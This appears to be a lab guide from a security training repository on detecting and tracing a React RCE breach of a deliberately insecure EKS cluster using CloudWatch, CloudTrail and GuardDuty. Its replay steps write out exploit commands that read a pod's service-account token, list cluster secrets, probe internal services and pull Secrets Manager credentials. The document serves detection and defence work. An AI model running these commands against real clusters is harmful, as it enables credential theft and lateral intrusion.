# react2shell: cloud monitoring

[Back](../README.md)

- [react2shell: cloud monitoring](#react2shell-cloud-monitoring)
  - [Overview](#overview)
  - [Log](#log)
    - [EKS audit log](#eks-audit-log)
    - [Netpol log](#netpol-log)
    - [CloudTrail](#cloudtrail)
  - [Detect](#detect)
    - [GuardDuty](#guardduty)
  - [Cloud Monitoring](#cloud-monitoring)
  - [Step](#step)
  - [GuardDuty](#guardduty-1)
  - [Alert to Slack](#alert-to-slack)
  - [Auto-response](#auto-response)
  - [Trace the breach](#trace-the-breach)

---

## Overview

- Following the workflow:
  - log -> detect -> alert -> trace -> debug

- Monitoring architecture

```txt
 log          EKS audit log  ─┐
              netpol log     ─┼─▶ CloudWatch
              CloudTrail     ─┴─▶ S3
                                   │
 detect       GuardDuty  ◀─────────┘   runtime (eBPF) + audit anomaly
                                   │
 alert        EventBridge ─▶ SNS ─▶ Slack ─▶ Lambda (auto-response)
```

---

## Log

### EKS audit log

- Enable log types:
  - `audit`: every k8s API call - who, verb, resource, namespace, IP.
  - `authenticator`: IAM -> k8s identity mapping; links the cloud/cluster planes.
- log group: `/aws/eks/<cluster>/cluster`
- stream `kube-apiserver-audit-*`

---

- confirm

```sh
# confirm enabled
aws eks describe-cluster --name react2shell-eks-insecure --query 'cluster.logging.clusterLogging[?enabled==`true`].types'
# [
#     [
#         "audit",
#         "authenticator"
#     ]
# ]

# SA reads the cluster secret
python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets'
    # {
    #   "metadata": {
    #     "name": "cluster-secret",
    #     "namespace": "internal",
    #   },
    #   "data": {
    #     "password": "Y0x1U1Rlci1TZWNSZVQ="
    #   },
    #   "type": "Opaque"
    # },
    # {
    #   "metadata": {
    #     "name": "container-secret",
    #     "namespace": "react",
    #   },
    #   "data": {
    #     "password": "Q29OdEFpbkVyLXNFY1JldC1JbnNFQ3VyRQ=="
    #   },
    #   "type": "Opaque"
    # }


# query: who read secrets
QID=$(aws logs start-query \
  --log-group-name /aws/eks/react2shell-eks-insecure/cluster \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --query-string 'fields @timestamp, user.username, verb, objectRef.namespace, objectRef.name, sourceIPs.0
    | filter @logStream like /kube-apiserver-audit/
    | filter objectRef.resource = "secrets" and verb in ["get","list"]
    | sort @timestamp desc' \
  --query queryId --output text)

# poll until "status": "Complete"
aws logs get-query-results --query-id $QID > log.txt
```

---

- Query in `CloudWatch`

```sql
SOURCE "/aws/eks/react2shell-eks-insecure/cluster" START=-3600s END=0s |
fields @timestamp, user.username, verb, objectRef.namespace, objectRef.name, sourceIPs.0
| filter @logStream like /kube-apiserver-audit/
| filter objectRef.resource = "secrets" and verb in ["get", "list"]
| sort @timestamp desc
| limit 100

/*
2026-10-17T18:08:50.098Z	system:serviceaccount:argocd:argocd-application-controller	list			10.0.33.70
2026-10-17T18:05:14.216Z	system:serviceaccount:react:react2shell	list			10.0.35.58
2026-10-17T17:58:49.848Z	system:serviceaccount:argocd:argocd-application-controller	list			10.0.33.70
*/

```

---

### Netpol log

- VPC CNI addon:
  - `enablePolicyEventLogs` + `enableCloudWatchLogs`
- CNI role:
  - `logs:CreateLogStream`
  - `PutLogEvents`;
  - Cost: +1 vCPU per node
- node file:
  - `/var/log/aws-routed-eni/network-policy-agent.log`

---

- confirm

```sh
# replay: react reaches the internal api
python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/internal/pods;'
        # "name": "internal-api-569c897c9f-42mlv",
        # "namespace": "internal",
        # "podIP": "10.0.39.236",
        #    "ports": [
        #        "containerPort": 3000,

python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "curl -fsSL http://10.0.39.236:3000/api/v1/healthz"
# {"status":"healthy","message":"Service is running"}

python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "curl -sS -m 5 http://internal-api.internal/api/v1/users"
# [{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]


# query: verdict on the react -> internal flow (dest port 3000)
# the agent logs one line of "KEY: value;" pairs - filter the stream first,
# then parse the fields out.
QID=$(aws logs start-query \
  --log-group-name /aws/eks/react2shell-eks-insecure/cluster \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --query-string 'fields @timestamp
    | filter @logStream like /network-policy-agent/
    | parse @message "SIP: *;SPORT: *;DIP: *;DPORT: *;PROTOCOL: *;PolicyVerdict: *;" as sip, sport, dip, dport, proto, verdict
    | filter dport = "3000"
    | display @timestamp, sip, dip, dport, verdict
    | sort @timestamp desc
    | limit 50' \
  --query queryId --output text)

aws logs get-query-results --query-id $QID
# {
#     "queryLanguage": "CWLI",
#     "results": [
#         [
#             {
#                 "field": "@timestamp",
#                 "value": "2026-10-17 19:25:38.700"
#             },
#             {
#                 "field": "sip",
#                 "value": "10.0.40.238"
#             },
#             {
#                 "field": "dip",
#                 "value": "10.0.39.236"
#             },
#             {
#                 "field": "dport",
#                 "value": "3000"
#             },
#             {
#                 "field": "verdict",
#                 "value": "ACCEPT"
#             },
#         ],
```

- `ACCEPT` on frontend→backend = backend not isolated (missing NetworkPolicy).

---

- Query in `CloudWatch`

```sql
SOURCE "/aws/eks/react2shell-eks-insecure/cluster" START=-3600s END=0s |
fields @timestamp
| filter @logStream like /network-policy-agent/
| parse @message "SIP: *;SPORT: *;DIP: *;DPORT: *;PROTOCOL: *;PolicyVerdict: *;" as sip, sport, dip, dport, proto, verdict
| filter dport = "3000"
| display @timestamp, sip, dip, dport, verdict
| sort @timestamp desc
| limit 100

/*
@timestamp                sip         dip         dport verdict
2026-10-17T19:25:38.700Z	10.0.40.238	10.0.39.236	3000	ACCEPT
2026-10-17T19:24:51.414Z	10.0.40.238	10.0.39.236	3000	ACCEPT
2026-10-17T19:24:51.413Z	10.0.40.238	10.0.39.236	3000	ACCEPT
2026-10-17T19:18:29.571Z	10.0.35.58	10.0.39.236	3000	ACCEPT
*/
```

---

### CloudTrail

- tf: `infra/eks-insecure/16_cloudtrail.tf` - multi-region trail to an S3 bucket.
- The whole cloud chain - `AssumeRoleWithWebIdentity`, `ListSecrets`,
  `GetSecretValue` - is **management events** (the read-type ones), captured by
  any trail that logs management events. No data event selector: Secrets Manager
  is not a supported CloudTrail data-event resource type.

---

- confirm

```sh
# replay: IRSA token -> STS AssumeRoleWithWebIdentity -> ListSecrets -> GetSecretValue
python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "node /tmp/s.js --list"

python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "node /tmp/s.js react2shell-eks-insecure-rds-credential"

# who assumed the pod role (CloudTrail delivery lags ~5-15 min)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRoleWithWebIdentity \
  --query 'Events[].{time:EventTime,user:Username}' --output table

# --------------------------------------------------------------------------------------------------------------------------------
# |                                                         LookupEvents                                                         |
# +---------------------------+--------------------------------------------------------------------------------------------------+
# |           time            |                                              user                                                |
# +---------------------------+--------------------------------------------------------------------------------------------------+
# |  2026-10-17T15:59:54-04:00|  system:serviceaccount:react:react2shell                                                         |
# |  2026-10-17T15:59:09-04:00|  system:serviceaccount:react:react2shell                                                         |
# |  2026-10-17T15:51:35-04:00|  system:serviceaccount:react:react2shell                                                         |
# |  2026-10-17T15:50:20-04:00|  system:serviceaccount:react:react2shell                                                         |
# |  2026-10-17T15:48:02-04:00|  system:serviceaccount:react:react2shell                               


# the crown-jewel read - also a management event, so lookup-events sees it
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue \
  --query 'Events[].{time:EventTime,user:Username,secret:Resources[0].ResourceName}' \
  --output table

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# |                                                                                                LookupEvents                                                                                                |
# +------------------------------------------------------------------------------------------------------------+----------------------------+------------------------------------------------------------------+
# |                                                   secret                                                   |           time             |                              user                                |
# +------------------------------------------------------------------------------------------------------------+----------------------------+------------------------------------------------------------------+
# |  react2shell-eks-insecure-rds-credential                                                                   |  2026-10-17T15:59:54-04:00 |  react2shell    
```

- Query in `CloudWatch` (the trail also streams to a log group, so the whole
  chain is queryable with the same Logs Insights syntax as the other logs)

```sql
SOURCE "/aws/cloudtrail/react2shell-eks-insecure" START=-3600s END=0s |
fields eventTime, userIdentity.arn, eventName, requestParameters.secretId
| filter eventName in ["AssumeRoleWithWebIdentity", "ListSecrets", "GetSecretValue"]
| sort @timestamp desc
| limit 50

/*
	
eventTime             userIdentity.arn                                                                      eventName               requestParameters.secretId
2026-10-17T20:19:16Z                                                                                        AssumeRoleWithWebIdentity	
2026-10-17T20:19:16Z  arn:aws:sts::099139718958:assumed-role/react2shell-eks-insecure-pod-irsa/react2shell  ListSecrets	
2026-10-17T20:16:04Z		                                                                                    AssumeRoleWithWebIdentity	
2026-10-17T20:16:04Z  arn:aws:sts::099139718958:assumed-role/react2shell-eks-insecure-pod-irsa/react2shell  sGetSecretValue	react2shell-eks-insecure-rds-credential
*/
```

---

## Detect

### GuardDuty

- tf: `infra/eks-insecure/17_guardduty.tf`
  - `aws_guardduty_detector`
  - `aws_guardduty_detector_feature`:
    - `EKS_AUDIT_LOGS` - cluster plane, reads the EKS audit log
    - `RUNTIME_MONITORING` + `EKS_ADDON_MANAGEMENT` - container plane, installs
      the managed eBPF agent (the Falco equivalent)

Expected findings - all generic, none naming our app or secret:

| Layer     | Finding                                                         | Severity |
| --------- | --------------------------------------------------------------- | -------- |
| Container | `Execution:Runtime/ReverseShell`                                | High     |
| Cluster   | `CredentialAccess:Kubernetes/AnomalousBehavior.SecretsAccessed` | Medium   |
| Cloud     | `CredentialAccess:IAMUser/AnomalousBehavior`                    | Medium   |
| All       | `AttackSequence:EKS/CompromisedCluster`                         | Critical |

> `AnomalousBehavior.*` need ~7-14 days of baseline and may not fire on a fresh
> cluster. Runtime findings are signature-based and fire immediately; use
> `create-sample-findings` to prove the pipeline meanwhile.

---

- confirm

```sh
DETECTOR=$(terraform -chdir=infra/eks-insecure output -raw guardduty_detector_id)

# features enabled?
aws guardduty get-detector --detector-id $DETECTOR \
  --query 'features[].{name:name,status:status}' --output table

# runtime agent landed?
kubectl -n amazon-guardduty get pods
# NAME                        READY   STATUS
# aws-guardduty-agent-xxxxx   1/1     Running

# replay the exploit (node /tmp/s.js ...), then list findings
IDS=$(aws guardduty list-findings --detector-id $DETECTOR \
  --finding-criteria '{"Criterion":{"severity":{"Gte":4}}}' \
  --query 'FindingIds' --output text)
aws guardduty get-findings --detector-id $DETECTOR --finding-ids $IDS \
  --query 'Findings[].{type:Type,sev:Severity,resource:Resource.ResourceType}' \
  --output table

# no baseline yet? prove the pipeline with a sample finding
aws guardduty create-sample-findings --detector-id $DETECTOR \
  --finding-types CredentialAccess:Kubernetes/AnomalousBehavior.SecretsAccessed
```

---


## Cloud Monitoring

AWS-native monitoring — the managed equivalent of the Falco + Loki + Grafana
stack used on kind.

```txt
 log          EKS audit log  ─┐
              netpol log     ─┼─▶ CloudWatch
              CloudTrail     ─┴─▶ S3
                                   │
 detect       GuardDuty  ◀─────────┘   runtime (eBPF) + audit anomaly
                                   │
 alert        EventBridge ─▶ SNS ─▶ Slack ─▶ Lambda (auto-response)
```

- Enable the logs before the detector — GuardDuty EKS findings are derived from
  the EKS audit log.
- Netpol logs, not VPC Flow Logs, for pod↔pod: Flow Logs carry no pod identity
  and miss same-node traffic.

---

## Step

Enable one source, replay the breach, confirm it shows up.

| #   | Step             | Replay                    | Milestone                                 |
| --- | ---------------- | ------------------------- | ----------------------------------------- |
| 1   | EKS audit log    | SA reads `backend` secret | secret access found in Logs Insights      |
| 2   | Netpol log       | react pod → backend api   | frontend→backend verdict logged           |
| 3   | CloudTrail       | pod assumes IRSA role     | `AssumeRoleWithWebIdentity` in trail      |
| 4   | GuardDuty        | re-run the exploit        | runtime + audit findings raised           |
| 5   | Alert to Slack   | sample finding            | Slack shows critical alert                |
| 6   | Auto-response    | re-run the exploit        | role session revoked, pod isolated        |
| 7   | Trace the breach | full exploit chain        | compromised layer and vulnerability named |

---


## GuardDuty

- `infra/eks-secure/16_guardduty.tf`
- `aws_guardduty_detector` + `aws_guardduty_detector_feature`:
  - `EKS_AUDIT_LOGS`
  - `RUNTIME_MONITORING` with `EKS_ADDON_MANAGEMENT`
    (mutually exclusive with the older `EKS_RUNTIME_MONITORING`)

```sh
# confirm features + agent
aws guardduty get-detector --detector-id <id> --query 'features[].{n:name,s:status}'
kubectl -n amazon-guardduty get pods

# replay the exploit, then list findings
aws guardduty list-findings --detector-id <id> \
  --finding-criteria '{"Criterion":{"severity":{"Gte":4}}}'
```

Expected findings — generic, no rule naming our app or secret:

| Layer     | Finding                                                         | Severity |
| --------- | --------------------------------------------------------------- | -------- |
| Container | `Execution:Runtime/ReverseShell`                                | High     |
| Cluster   | `CredentialAccess:Kubernetes/AnomalousBehavior.SecretsAccessed` | Medium   |
| Cloud     | `CredentialAccess:IAMUser/AnomalousBehavior`                    | Medium   |
| All       | `AttackSequence:EKS/CompromisedCluster`                         | Critical |

- `AnomalousBehavior.*` needs ~7–14 days of baseline — may not fire on a new
  cluster. Runtime findings are signature-based and fire immediately.

---

## Alert to Slack

- `infra/eks-secure/17_alerting.tf`
- EventBridge rule: `source = aws.guardduty`, `severity >= 7` → SNS → Slack
- route on severity, not finding type

```sh
# test the path without a breach
aws guardduty create-sample-findings --detector-id <id> \
  --finding-types CredentialAccess:Kubernetes/AnomalousBehavior.SecretsAccessed
```

- Demo fallback: if GuardDuty has no baseline yet, add an EventBridge rule on
  `AssumeRoleWithWebIdentity` / `ListSecrets` to guarantee an alert.
  Use EventBridge, not a CloudWatch metric filter — CloudTrail → CloudWatch
  delivery lags 5–15 min.

---

## Auto-response

- Lambda on the same EventBridge rule:
  - revoke the IRSA role sessions (`AWSRevokeOlderSessions`)
  - apply a deny-all NetworkPolicy to the pod label
- Secrets Manager rotation caps the lifetime of a stolen credential.

---

## Trace the breach

Replay the full chain; each signal names the layer that failed.

| Signal                                        | Layer     | Vulnerability                 |
| --------------------------------------------- | --------- | ----------------------------- |
| image scan: CVE-2025-55182                    | Code      | unpatched dependency          |
| `Execution:Runtime/ReverseShell`              | Container | no PSS, root, writable rootfs |
| netpol log: `ACCEPT` frontend→backend         | Cluster   | backend not isolated          |
| audit: `verb=get resource=secrets ns=backend` | Cluster   | RBAC grants SA secret access  |
| CloudTrail: `AssumeRoleWithWebIdentity`       | Cloud     | IRSA role bound to a web pod  |
| CloudTrail: `GetSecretValue`                  | Cloud     | IAM policy `Action:*`         |
